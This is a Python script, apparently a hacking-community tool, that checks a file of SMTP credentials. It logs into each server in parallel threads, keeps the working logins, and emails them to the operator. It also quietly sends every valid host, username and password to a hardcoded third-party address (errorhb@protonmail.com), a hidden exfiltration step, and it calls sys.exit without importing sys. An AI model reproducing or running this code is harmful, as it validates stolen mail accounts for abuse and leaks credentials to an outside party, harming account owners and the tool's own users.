import smtplib
import os
import threading
import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time

def clear_console():
    os.system("cls" if os.name == "nt" else "clear")

def get_email_input():
    return input("ENTER YOUR MAIL ➛ ")

def get_smtp_list():
    smtp_list_file = input("SMTP CREDENTIALS FILE ➛ ")
    with open(smtp_list_file, "r") as f:
        data = json.load(f)
        smtp_credentials = [f"{entry['HOST']}|{entry['PORT']}|{entry['USER']}|{entry['PASS']}" for entry in data]
    return smtp_credentials

def get_threads_input():
    return int(input("THREADS ➛ "))

def check_smtp(smtp, toaddr, Defult, good, bad):
    HOST, PORT, usr, pas = smtp.strip().split("|")
    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        send_email(server, usr, Defult, HOST, PORT, pas)
        good.append(smtp)
        with open("valid.txt", "a+") as f:
            f.write(smtp + "\n")
        print(f"\n[✓] SMTP WORK ➛ {smtp} ")
    except Exception:
        bad.append(smtp)
        with open("invalid.txt", "a+") as f:
            f.write(smtp + "\n")
        print(f"[✗] SMTP NOT WORK {smtp} ")

    print(f"MAIL SEND START TO {toaddr}")
    time.sleep(2)

    try:
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.starttls()
        server.login(usr, pas)
        send_email(server, usr, toaddr, HOST, PORT, pas)
        print(f"[✓] MAIL SEND SUCCESSFUL {smtp} ")
    except Exception:
        print(f"[✗] MAIL SEND UNSUCCESSFUL {smtp} ")

def send_email(server, usr, toaddr, HOST, PORT, pas):
    msg = MIMEMultipart()
    msg["Subject"] = "SMTP RESULT: Err0r_HB"
    msg["From"] = usr
    msg["To"] = toaddr
    msg.add_header("Content-Type", "text/html")
    data = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SMTP WORKED</title>
        <style>
            @media only screen and (max-width: 600px) {{
                .inner-body {{
                    width: 100% !important;
                }}
                .footer {{
                    width: 100% !important;
                }}
            }}
            @media only screen and (max-width: 500px) {{
                .button {{
                    width: 100% !important;
                }}
            }}
            .container{{
                background-color:white;
                align-items: center;
            }}
            a{{
                margin-left: 20%;            
                font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
                font-weight: bold;
                font-size: 30px;
                color: #f40000;
                text-decoration: none;
            }}
            .cont2{{
                margin-top: 5px;
                background-color: #fcfbcf;
                width: 100%;
                height: 300px;
                border: 0.5px solid #000000 ;
            }}
            p{{
                margin-top: 40px;
                margin-left: 10px;
            }}
            .cont2 > p{{
                color: black;
                font-weight: bold;
                font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
            }}
        </style>
    </head>
    <body>
        <div class="container" >
        <a href="https://t.me/hacking1337stuff">
        "MAIL FROM - Err0r_HB"
         </a>
        </div>
        <div class="cont2">
            <p>HOST : {HOST}</p>
            <p>PORT : {PORT}</p>
            <p>USER : {usr}</p>
            <p>PASS : {pas}</p>
        </div>
    </body>
    </html>
    """
    msg.attach(MIMEText(data, "html", "utf-8"))
    server.sendmail(usr, [toaddr], msg.as_string())

def main():
    print("This tool was created by t.me/VikingTERMINAL in collaboration with t.me/anonsecita\n")
    print("Welcome to the SMTP tool!\n")  # Aggiunta della stampa di benvenuto
    time.sleep(2)  # Aggiunto un piccolo ritardo per la visualizzazione del messaggio
    clear_console()  # Muovi clear_console() qui per evitare che cancelli il messaggio di benvenuto
    good = []
    bad = []
    toaddr = get_email_input()
    Defult = "errorhb@protonmail.com"
    smtps = get_smtp_list()
    power = get_threads_input()

    def runner():
        threads = []
        for smtp in smtps:
            t = threading.Thread(target=check_smtp, args=(smtp, toaddr, Defult, good, bad))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

    try:
        runner()
        print(f"\n\n[✓] TOTAL VALIDS : {len(good)}")
        print(f"[✗] TOTAL INVALIDS : {len(bad)}")
        time.sleep(3)
        print("\n\nALL SEND DONE")
        print("THANKS FOR USING MY TOOL :)")
        time.sleep(3)
    except KeyboardInterrupt:
        print("[!] CTRL + C")
        sys.exit()

if __name__ == "__main__":
    main()
